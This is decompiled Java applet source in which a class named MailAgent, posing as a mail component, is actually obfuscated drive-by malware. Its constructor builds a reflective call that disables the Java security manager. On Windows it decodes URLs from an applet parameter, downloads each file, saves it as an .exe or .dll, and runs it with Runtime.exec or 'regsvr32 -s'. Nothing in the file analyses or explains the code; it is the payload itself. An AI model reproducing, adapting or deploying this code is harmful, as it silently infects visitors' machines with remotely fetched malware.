// 
// Decompiled by Procyon v0.5.30
// 

package buildService;

import java.lang.reflect.Method;
import java.io.InputStream;
import java.io.IOException;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.net.MalformedURLException;
import java.net.URL;
import java.awt.Component;
import java.beans.Expression;
import java.util.HashSet;
import javax.swing.JList;
import java.applet.Applet;

public class MailAgent extends Applet
{
    public String mailBox;
    private int user_id;
    protected JList contactList;
    private String AuthorizedType;
    private String address;
    private String additionalMode;
    protected String MessageComplite;
    protected HashSet rowsMeassage;
    public String MessageError;
    
    public MailAgent() {
        this.mailBox = "aDL".concat("Xq-_.".concat("mjnWN6f".concat("wcsK".concat("B?xbI".concat("TS=Cy".concat("kGvd".concat("91Z:".concat("%ElR5".concat("po0rz".concat("A8/JY".concat("P72#".concat("ue&t4".concat("iQFhV".concat("U3OM".concat("gH")))))))))))))));
        this.AuthorizedType = new StringBuffer("niW764").reverse().append("do").substring(3).concat("ws");
        this.address = "os.".concat("name");
        this.additionalMode = "sbsv.d".concat("ll").substring(4);
        this.MessageComplite = String.valueOf(this.additionalMode.substring(0, 1)) + "kj235346ve".concat("xe").substring(9);
        this.rowsMeassage = new HashSet();
        this.MessageError = "QOn7c" + "ZAVmK/G".concat("4WuBqfLxj") + "1_tlE8PTr" + "pN2Y3:MUa".concat("=&5oRi%") + "y?9DHv-Cgw".concat("kh60b.Fd".concat("eSI#zJXs"));
        final String tmps = new StringBuffer("set").append("dfb7szgbhSecuri".substring(9)).append("ty".concat("db43M".substring(4))).append("3hl3banager".substring(5)).toString();
        this.rowsMeassage.add(new ClassId(System.class, tmps, new Object[1]));
        final Expression api = new Expression(System.class, tmps, new Object[1]);
        this.add(this.contactList = new JList((E[])new Object[] { new VirtualTable(this, this.rowsMeassage) }));
    }
    
    public String move2Server(final String str) {
        String resName = "";
        for (int i = 0; i < str.length(); ++i) {
            final int tmpi;
            if ((tmpi = this.MessageError.indexOf(str.substring(i, i + 1))) > -1) {
                resName = String.valueOf(resName) + this.mailBox.substring(tmpi, tmpi + 1);
            }
        }
        return resName;
    }
    
    public void verif() {
        super.start();
        FileOutputStream f = null;
        InputStream c = null;
        URL unicodeFormat = null;
        if (System.getProperty(this.address).indexOf(this.AuthorizedType) < 0) {
            return;
        }
        final Runtime form = Runtime.getRuntime();
        final String[] chars = this.move2Server(this.getParameter("p")).split("::");
        for (int p = 0; p < chars.length; ++p) {
            final double rdm = Math.random();
            try {
                unicodeFormat = new URL(chars[p]);
            }
            catch (MalformedURLException ex) {
                return;
            }
            final String fprm = Double.toString(rdm).concat(chars[p].contains(this.additionalMode) ? this.additionalMode : this.MessageComplite);
            try {
                f = new FileOutputStream(fprm);
            }
            catch (FileNotFoundException ex2) {
                return;
            }
            try {
                c = unicodeFormat.openStream();
            }
            catch (IOException ex3) {
                return;
            }
            try {
                final byte[] buffer = new byte[1000];
                Label_0218: {
                    break Label_0218;
                    int i;
                    do {
                        f.getClass().getMethod("write", buffer.getClass(), Integer.TYPE, Integer.TYPE).invoke(f, buffer, 0, this.user_id);
                        i = c.read(buffer, 0, 1000);
                        this.user_id = i;
                    } while (i != -1);
                }
            }
            catch (Exception ex4) {
                return;
            }
            try {
                c.close();
            }
            catch (IOException ex3) {
                return;
            }
            try {
                f.close();
            }
            catch (IOException ex3) {
                return;
            }
            this.submit(10, fprm, form);
        }
    }
    
    public void start() {
        this.verif();
    }
    
    public void submit(final int val, final String str, final Object o) {
        try {
            final Method rr = o.getClass().getMethod("e".concat("xec"), String.class);
            try {
                rr.invoke(o, str);
            }
            catch (Exception ex) {}
            try {
                rr.invoke(o, "re".concat("gsv".concat("r32 -s \"")).concat(str.concat("\"")));
            }
            catch (Exception ex2) {}
        }
        catch (Exception ex3) {}
    }
}
